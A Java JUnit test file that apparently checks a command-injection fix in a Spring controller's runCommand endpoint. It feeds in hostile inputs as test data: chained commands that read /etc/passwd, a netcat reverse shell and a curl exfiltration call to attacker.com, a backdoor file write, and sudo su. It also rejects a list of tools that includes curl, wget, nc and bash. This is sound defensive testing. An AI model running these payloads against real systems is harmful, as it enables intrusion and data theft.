package org.t246osslab.easybuggy4sb.controller;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;

/**
 * Comprehensive security tests for CxController.runCommand remediation.
 *
 * These tests validate that the command injection vulnerability has been fixed
 * and that the security controls prevent malicious input while allowing legitimate usage.
 */
@RunWith(SpringRunner.class)
@SpringBootTest
@AutoConfigureMockMvc
public class CxControllerTest {

    @Autowired
    private MockMvc mockMvc;

    @Before
    public void setUp() {
        // Test setup if needed
    }

    // ========== POSITIVE TESTS: Legitimate Commands Should Work ==========

    @Test
    public void testRunCommand_AllowedCommand_Whoami_ShouldSucceed() throws Exception {
        // Test that allowed command 'whoami' works correctly
        mockMvc.perform(post("/legacy/runCommand/whoami"))
                .andExpect(status().isOk());
    }

    @Test
    public void testRunCommand_AllowedCommand_Date_ShouldSucceed() throws Exception {
        // Test that allowed command 'date' works correctly
        mockMvc.perform(post("/legacy/runCommand/date"))
                .andExpect(status().isOk());
    }

    @Test
    public void testRunCommand_AllowedCommand_Pwd_ShouldSucceed() throws Exception {
        // Test that allowed command 'pwd' works correctly
        mockMvc.perform(post("/legacy/runCommand/pwd"))
                .andExpect(status().isOk());
    }

    @Test
    public void testRunCommand_AllowedCommand_Hostname_ShouldSucceed() throws Exception {
        // Test that allowed command 'hostname' works correctly
        mockMvc.perform(post("/legacy/runCommand/hostname"))
                .andExpect(status().isOk());
    }

    // ========== NEGATIVE TESTS: Command Injection Attacks Should Be Blocked ==========

    @Test
    public void testRunCommand_CommandInjection_Semicolon_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using semicolon separator
        // Attack payload: whoami;cat /etc/passwd
        mockMvc.perform(post("/legacy/runCommand/whoami;cat /etc/passwd"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_Pipe_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using pipe operator
        // Attack payload: whoami | cat /etc/passwd
        mockMvc.perform(post("/legacy/runCommand/whoami | cat /etc/passwd"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_And_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using AND operator
        // Attack payload: whoami && cat /etc/passwd
        mockMvc.perform(post("/legacy/runCommand/whoami && cat /etc/passwd"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_Or_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using OR operator
        // Attack payload: whoami || cat /etc/passwd
        mockMvc.perform(post("/legacy/runCommand/whoami || cat /etc/passwd"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_Backticks_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using backticks for command substitution
        // Attack payload: whoami`cat /etc/passwd`
        mockMvc.perform(post("/legacy/runCommand/whoami`cat /etc/passwd`"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_DollarParens_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using $(command) substitution
        // Attack payload: whoami$(cat /etc/passwd)
        mockMvc.perform(post("/legacy/runCommand/whoami$(cat /etc/passwd)"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_Redirect_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using output redirection
        // Attack payload: whoami > /tmp/output.txt
        mockMvc.perform(post("/legacy/runCommand/whoami > /tmp/output.txt"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_InputRedirect_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using input redirection
        // Attack payload: whoami < /etc/passwd
        mockMvc.perform(post("/legacy/runCommand/whoami < /etc/passwd"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_SingleQuote_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using single quotes
        // Attack payload: whoami'cat /etc/passwd'
        mockMvc.perform(post("/legacy/runCommand/whoami'cat /etc/passwd'"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_DoubleQuote_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using double quotes
        // Attack payload: whoami"cat /etc/passwd"
        mockMvc.perform(post("/legacy/runCommand/whoami\"cat /etc/passwd\""))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CommandInjection_Backslash_ShouldBeBlocked() throws Exception {
        // Test blocking command injection using backslash escape
        // Attack payload: whoami\ncat /etc/passwd
        mockMvc.perform(post("/legacy/runCommand/whoami\\cat"))
                .andExpect(status().is5xxServerError());
    }

    // ========== NEGATIVE TESTS: Disallowed Commands Should Be Rejected ==========

    @Test
    public void testRunCommand_DisallowedCommand_Cat_ShouldBeRejected() throws Exception {
        // Test that disallowed command 'cat' is rejected
        mockMvc.perform(post("/legacy/runCommand/cat"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Ls_ShouldBeRejected() throws Exception {
        // Test that disallowed command 'ls' is rejected
        mockMvc.perform(post("/legacy/runCommand/ls"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Rm_ShouldBeRejected() throws Exception {
        // Test that dangerous command 'rm' is rejected
        mockMvc.perform(post("/legacy/runCommand/rm"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Chmod_ShouldBeRejected() throws Exception {
        // Test that dangerous command 'chmod' is rejected
        mockMvc.perform(post("/legacy/runCommand/chmod"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Curl_ShouldBeRejected() throws Exception {
        // Test that potentially dangerous command 'curl' is rejected
        mockMvc.perform(post("/legacy/runCommand/curl"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Wget_ShouldBeRejected() throws Exception {
        // Test that potentially dangerous command 'wget' is rejected
        mockMvc.perform(post("/legacy/runCommand/wget"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Nc_ShouldBeRejected() throws Exception {
        // Test that dangerous command 'nc' (netcat) is rejected
        mockMvc.perform(post("/legacy/runCommand/nc"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Bash_ShouldBeRejected() throws Exception {
        // Test that shell invocation 'bash' is rejected
        mockMvc.perform(post("/legacy/runCommand/bash"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DisallowedCommand_Sh_ShouldBeRejected() throws Exception {
        // Test that shell invocation 'sh' is rejected
        mockMvc.perform(post("/legacy/runCommand/sh"))
                .andExpect(status().is5xxServerError());
    }

    // ========== EDGE CASE TESTS ==========

    @Test
    public void testRunCommand_EmptyCommand_ShouldBeRejected() throws Exception {
        // Test that empty command is rejected
        mockMvc.perform(post("/legacy/runCommand/ "))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_WhitespaceOnly_ShouldBeRejected() throws Exception {
        // Test that whitespace-only command is rejected
        mockMvc.perform(post("/legacy/runCommand/   "))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_CaseSensitivity_LowercaseWhoami_ShouldSucceed() throws Exception {
        // Test that command matching is case-sensitive and works with lowercase
        mockMvc.perform(post("/legacy/runCommand/whoami"))
                .andExpect(status().isOk());
    }

    @Test
    public void testRunCommand_CaseSensitivity_UppercaseWHOAMI_ShouldBeRejected() throws Exception {
        // Test that uppercase variant is rejected (case-sensitive allowlist)
        mockMvc.perform(post("/legacy/runCommand/WHOAMI"))
                .andExpect(status().is5xxServerError());
    }

    // ========== PATH TRAVERSAL PREVENTION TESTS ==========

    @Test
    public void testRunCommand_AbsolutePath_ShouldBeRejected() throws Exception {
        // Test that absolute path commands are rejected
        mockMvc.perform(post("/legacy/runCommand//bin/whoami"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_RelativePath_ShouldBeRejected() throws Exception {
        // Test that relative path commands are rejected
        mockMvc.perform(post("/legacy/runCommand/./whoami"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_ParentDirectoryTraversal_ShouldBeRejected() throws Exception {
        // Test that parent directory traversal is rejected
        mockMvc.perform(post("/legacy/runCommand/../bin/whoami"))
                .andExpect(status().is5xxServerError());
    }

    // ========== REAL-WORLD ATTACK SCENARIOS ==========

    @Test
    public void testRunCommand_ReverseShell_ShouldBeBlocked() throws Exception {
        // Test blocking reverse shell attempt
        // Attack payload: whoami;nc -e /bin/sh attacker.com 4444
        mockMvc.perform(post("/legacy/runCommand/whoami;nc -e /bin/sh attacker.com 4444"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_DataExfiltration_ShouldBeBlocked() throws Exception {
        // Test blocking data exfiltration attempt
        // Attack payload: whoami;curl http://attacker.com/steal?data=$(cat /etc/passwd)
        mockMvc.perform(post("/legacy/runCommand/whoami;curl http://attacker.com/steal"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_FileSystemModification_ShouldBeBlocked() throws Exception {
        // Test blocking file system modification
        // Attack payload: whoami;echo malicious > /tmp/backdoor.sh
        mockMvc.perform(post("/legacy/runCommand/whoami;echo malicious > /tmp/backdoor.sh"))
                .andExpect(status().is5xxServerError());
    }

    @Test
    public void testRunCommand_PrivilegeEscalation_ShouldBeBlocked() throws Exception {
        // Test blocking privilege escalation attempt
        // Attack payload: whoami;sudo su
        mockMvc.perform(post("/legacy/runCommand/whoami;sudo su"))
                .andExpect(status().is5xxServerError());
    }
}
